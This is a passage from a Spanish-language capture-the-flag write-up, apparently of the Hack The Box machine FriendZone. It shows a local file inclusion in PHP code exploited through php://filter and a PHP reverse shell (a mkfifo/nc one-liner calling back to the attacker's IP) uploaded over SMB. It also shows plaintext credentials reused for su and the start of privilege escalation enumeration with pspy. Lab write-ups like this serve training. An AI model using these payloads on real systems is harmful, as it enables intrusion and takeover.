nZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span>

&lt;?php

//echo <span class="s2">"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;"</span><span class="p">;</span>
//echo <span class="s2">"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;"</span><span class="p">;</span>
<span class="nb">echo</span> <span class="s2">"&lt;title&gt;FriendZone Admin !&lt;/title&gt;"</span><span class="p">;</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="o">[</span><span class="s2">"FriendZoneAuth"</span><span class="o">]</span><span class="p">;</span>

<span class="k">if</span> <span class="o">(</span><span class="nv">$auth</span> <span class="o">===</span> <span class="s2">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span class="o">){</span>
 <span class="nb">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>

<span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;"</span><span class="p">;</span>
<span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;"</span><span class="p">;</span>

<span class="k">if</span><span class="o">(!</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"image_id"</span><span class="o">])){</span>
  <span class="nb">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
  <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
  <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
  <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
 <span class="o">}</span><span class="k">else</span><span class="o">{</span>
 <span class="nv">$image</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"image_id"</span><span class="o">]</span><span class="p">;</span>
 <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;img src='images/</span><span class="nv">$image</span><span class="s2">'&gt;&lt;/center&gt;"</span><span class="p">;</span>

 <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;"</span><span class="p">;</span>
 include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"pagename"</span><span class="o">]</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
 //echo <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"pagename"</span><span class="o">]</span><span class="p">;</span>
 <span class="o">}</span>
<span class="o">}</span><span class="k">else</span><span class="o">{</span>
<span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;"</span><span class="p">;</span>
<span class="o">}</span>
?&gt;

</code></pre></div></div>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=php://filter/convert.base64-encode/resource=/var/www/uploads/upload.php</code> En el cual podemos ver que realmente no se está haciendo nada y podría tratarse de un <strong>Rabbit Hole</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K"</span> | <span class="nb">base64</span> <span class="nt">-d</span>

&lt;?php

// not finished yet <span class="nt">--</span> friendzone admin <span class="o">!</span>

<span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">"image"</span><span class="o">])){</span>

<span class="nb">echo</span> <span class="s2">"Uploaded successfully !&lt;br&gt;"</span><span class="p">;</span>
<span class="nb">echo time</span><span class="o">()</span>+3600<span class="p">;</span>
<span class="o">}</span><span class="k">else</span><span class="o">{</span>

<span class="nb">echo</span> <span class="s2">"WHAT ARE YOU TRYING TO DO HOOOOOOMAN !"</span><span class="p">;</span>

<span class="o">}</span>

?&gt;
</code></pre></div></div>

<p>Recapitulando un poco, podemos acceder a recursos php dentro del sistema desde el sitio web y tenemos un directorio en el servicio SMB en el cual contamos con permisos de escritura; así que podríamos tratar de subir un archivo php de prueba.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
        <span class="k">echo</span> <span class="s2">"Esto es una prueba"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.123/Development <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Mon Dec  6 20:53:58 2021
  ..                                  D        0  Wed Jan 23 15:51:02 2019

                9221460 blocks of size 1024. 6460320 blocks available
smb: <span class="se">\&gt;</span> put test.php
putting file test.php as <span class="se">\t</span>est.php <span class="o">(</span>0.1 kb/s<span class="o">)</span> <span class="o">(</span>average 0.1 kb/s<span class="o">)</span>
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Mon Dec  6 21:54:17 2021
  ..                                  D        0  Wed Jan 23 15:51:02 2019
  test.php                            A       37  Mon Dec  6 21:54:18 2021

                9221460 blocks of size 1024. 6460316 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>Y ahora, pensando un poco, vemos que el directorio <code class="language-plaintext highlighter-rouge">Files</code> del servicio SMB se encuentra en la ruta <code class="language-plaintext highlighter-rouge">/etc/Files</code>; asi que podriamos pensar que el directorio <code class="language-plaintext highlighter-rouge">Development</code> se encuentra en una ruta similar <code class="language-plaintext highlighter-rouge">/etc/Development</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pagename=/etc/Development/test</code></li>
</ul>

<p><img src="/assets/images/htb-friendzone/friendzone-web9.png" alt=""></p>

<p>Se nos interpreta nuestro código, así que ahora, vamos a entablarnos una reverse shell:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
        <span class="nb">system</span><span class="p">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.27 443 &gt;/tmp/f"</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.123/Development <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> put shell.php
putting file shell.php as <span class="se">\s</span>hell.php <span class="o">(</span>0.2 kb/s<span class="o">)</span> <span class="o">(</span>average 0.2 kb/s<span class="o">)</span>
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Mon Dec  6 22:02:58 2021
  ..                                  D        0  Wed Jan 23 15:51:02 2019
  test.php                            A       37  Mon Dec  6 21:54:18 2021
  shell.php                           A       98  Mon Dec  6 22:02:58 2021

                9221460 blocks of size 1024. 6460296 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>Nos ponemos en escucha por el puerto 443 y tratamos de ingresar a <code class="language-plaintext highlighter-rouge">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.123] 43062
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
$
</span></code></pre></div></div>

<p>Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Para trabajar más cómodos, hacemos un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Ahora nos queda escalar privilegios, por lo que vamos a enumerar un poco el sistema.</p>

<p>Si checamos el directorio de <code class="language-plaintext highlighter-rouge">www-data</code>, vemos algo interesante, un archivo <code class="language-plaintext highlighter-rouge">mysql_data.conf</code>, así que vamos a echarle un ojo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@FriendZone:/home/friend<span class="nv">$ </span><span class="nb">cd</span> /var/www/
www-data@FriendZone:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 28
drwxr-xr-x 3 root root 4096 Jan 16  2019 admin
drwxr-xr-x 4 root root 4096 Oct  6  2018 friendzone
drwxr-xr-x 2 root root 4096 Oct  6  2018 friendzoneportal
drwxr-xr-x 2 root root 4096 Jan 15  2019 friendzoneportaladmin
drwxr-xr-x 3 root root 4096 Oct  6  2018 html
<span class="nt">-rw-r--r--</span> 1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x 3 root root 4096 Oct  6  2018 uploads
www-data@FriendZone:/var/www<span class="nv">$ </span><span class="nb">cat </span>mysql_data.conf 
<span class="k">for </span>development process this is the mysql creds <span class="k">for </span>user friend

<span class="nv">db_user</span><span class="o">=</span>friend

<span class="nv">db_pass</span><span class="o">=</span>Agpyu12!0.213<span class="err">$</span>

<span class="nv">db_name</span><span class="o">=</span>FZ
www-data@FriendZone:/var/www<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos unas credenciales del usuario <code class="language-plaintext highlighter-rouge">friend</code> supuestamente del servicio <code class="language-plaintext highlighter-rouge">mysql</code>; sin embargo, la utilidad no se encuentra instalada.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@FriendZone:/var/www<span class="nv">$ </span>which mysql
www-data@FriendZone:/var/www<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
root:x:0:0:root:/root:/bin/bash
friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
www-data@FriendZone:/var/www<span class="err">$</span>
</code></pre></div></div>

<p>Podríamos pensar que podrían ser las credenciales a nivel de sistema del usuario <code class="language-plaintext highlighter-rouge">friend</code>, por lo que podríamos probar.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@FriendZone:/var/www<span class="nv">$ </span>su friend
Password: 
friend@FriendZone:/var/www<span class="nv">$ </span><span class="nb">whoami
</span>friend
friend@FriendZone:/var/www<span class="err">$</span>
</code></pre></div></div>

<p>Somos el usuario <code class="language-plaintext highlighter-rouge">friend</code>. Ahora vamos a tratar de convertirnos en el usuario <code class="language-plaintext highlighter-rouge">root</code>, por lo que enumeraremos un poco el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>friend<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>friend<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>friend<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
friend@FriendZone:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>friend: 
friend@FriendZone:/<span class="nv">$ </span>find <span class="se">\-</span>perm 4000 2&gt;/dev/null
friend@FriendZone:/<span class="nv">$ </span><span class="nb">cd </span>opt/
friend@FriendZone:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
friend@FriendZone:/opt<span class="nv">$ </span><span class="nb">cd </span>server_admin/
friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rwxr--r--</span> 1 root root 424 Jan 16  2019 reporter.py
friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">cat </span>reporter.py 
<span class="c">#!/usr/bin/python</span>

import os

to_address <span class="o">=</span> <span class="s2">"admin1@friendzone.com"</span>
from_address <span class="o">=</span> <span class="s2">"admin2@friendzone.com"</span>

print <span class="s2">"[+] Trying to send email to %s"</span>%to_address

<span class="c">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span>

<span class="c">#os.system(command)</span>

<span class="c"># I need to edit the script later</span>
<span class="c"># Sam ~ python developer</span>
friend@FriendZone:/opt/server_admin<span class="err">$</span>
</code></pre></div></div>

<p>Bajo la ruta <code class="language-plaintext highlighter-rouge">/opt/server_admin</code> nos encontramos con un archivo curioso llamado <code class="language-plaintext highlighter-rouge">reporter.py</code> cuyo propietario es <code class="language-plaintext highlighter-rouge">root</code>. Podríamos pensar que el programa se está ejecuntando a intervalos regulares y lo podemos corroborar con la utilidad <a href="https://github.com/DominicBreuker/pspy">pspy</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> /opt/pspy
❯ <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build <span class="nt">-ldflags</span> <span class="s2">"-s -w"</span> <span class="nb">.</span>
❯ <span class="nb">du</span> <span class="nt">-hc</span> pspy
2.7M    pspy
2.7M    total
❯ upx brute pspy
                       Ultimate Packer <span class="k">for </span>eXecutables
                          Copyright <span class="o">(</span>C<span class="o">)</span> 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   <span class="nt">--------------------</span>   <span class="nt">------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>
upx: brute: FileNotFoundException: brute: No such file or directory
   2748416 -&gt;   1059396   38.55%   linux/amd64   pspy                          

Packed 1 file.
❯ <span class="nb">du</span> <span class="nt">-hc</span> pspy
1.1M    pspy
1.1M    total
</code></pre></div></div>

<p>Transfermimos el archivo <code class="language-plaintext highlighter-rouge">pspy</code> a la máquina víctima y lo ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.123 - - <span class="o">[</span>06/Dec/2021 22:45:36] <span class="s2">"GET /pspy HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/dev/shm<span class="nv">$ </span>wget http://10.10.14.27/pspy
<span class="nt">--2021-12-07</span> 06:50:34--  http://10.10.14.27/pspy
Connecting to 10.10.14.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1059396 <span class="o">(</span>1.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: ‘pspy’

pspy                             100%[<span class="o">=======================================================&gt;]</span>   1.01M   932KB/s    <span class="k">in </span>1.1s    

2021-12-07 06:50:35 <span class="o">(</span>932 KB/s<span class="o">)</span> - ‘pspy’ saved <span class="o">[</span>1059396/1059396]

friend@FriendZone:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x pspy
friend@FriendZone:/dev/shm<span class="nv">$ </span>./pspy
pspy - version:  - Commit SHA:                                                                                                   
                                                                                                                                 
                                                                                                                                 
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                          
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                          
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                          
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░               
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░        
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒              
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                           
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                            
                   ░           ░ ░                                                                                               
                               ░ ░                                                                                               
                                                                
Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scannning <span class="k">for </span>processes every 100ms and on 
inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
Draining file system events due to startup...                                                                                    
<span class="k">done                                                            
</span>2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>98     |            
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>9438   |                                                                                   2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>9      |                                                                                   
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>88     |                                                                                   
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>107  <span class="nv">PID</span><span class="o">=</span>853    | /usr/sbin/exim4 <span class="nt">-bd</span> <span class="nt">-q30m</span>                                                         
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>849    | /usr/sbin/smbd <span class="nt">--foreground</span> <span class="nt">--no-process-group</span>                                    
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>844    | /usr/sbin/smbd <span class="nt">--foreground</span> <span class="nt">--no-process-group</span>                                    
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>843    | /usr/sbin/smbd <span class="nt">--foreground</span> <span class="nt">--no-process-group</span>                                    
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>82     |                                                                                   
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>81     |                                                                                   
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>80     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>8      | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>79     |                                                                                   
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>78     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>77     |                                                                                   
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>741    | /usr/sbin/smbd <span class="nt">--foreground</span> <span class="nt">--no-process-group</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7      | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>6      | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>565    | /usr/sbin/nmbd <span class="nt">--foreground</span> <span class="nt">--no-process-group</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>558    | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>556    | /sbin/agetty <span class="nt">-o</span> <span class="nt">-p</span> <span class="nt">--</span> <span class="se">\u</span> <span class="nt">--noclear</span> tty1 linux 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>535    | /usr/sbin/sshd <span class="nt">-D</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>533    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>109  <span class="nv">PID</span><span class="o">=</span>517    | /usr/sbin/named <span class="nt">-f</span> <span class="nt">-4</span> <span class="nt">-u</span> <span class="nb">bind 
</span>2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>44084  | ./pspy
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44055  | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4      | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>372    | /usr/lib/accountsservice/accounts-daemon 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>371    | /usr/bin/python3 /usr/bin/networkd-dispatcher <span class="nt">--run-startup-triggers</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>369    | /usr/bin/VGAuthService 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>103  <span class="nv">PID</span><span class="o">=</span>368    | /usr/bin/dbus-daemon <span class="nt">--system</span> <span class="nt">--address</span><span class="o">=</span>systemd: <span class="nt">--nofork</span> <span class="nt">--nopidfile</span> <span class="nt">--systemd-ac</span>
tivation <span class="nt">--syslog-only</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>360    | /usr/sbin/cron <span class="nt">-f</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>102  <span class="nv">PID</span><span class="o">=</span>359    | /usr/sbin/rsyslogd <span class="nt">-n</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>358    | /lib/systemd/systemd-logind 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>35     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>34     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>62583 <span class="nv">PID</span><span class="o">=</span>338    | /lib/systemd/systemd-timesyncd 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>101  <span class="nv">PID</span><span class="o">=</span>335    | /lib/systemd/systemd-resolved 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>30     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>29     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>28     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>27     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>100  <span class="nv">PID</span><span class="o">=</span>269    | /lib/systemd/systemd-networkd 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>264    | /lib/systemd/systemd-udevd 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>25     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>24     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>23     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>226    | /lib/systemd/systemd-journald 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>225    | /usr/bin/vmtoolsd 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>22     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>2176   | /bin/sh <span class="nt">-i</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>21     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>20     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2      | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>197    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>196    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>19     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>18     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>175    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>174    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>173    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>171    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>170    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>17     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>169    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>16     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>15     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>14     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>13     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1201   | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>12     | 
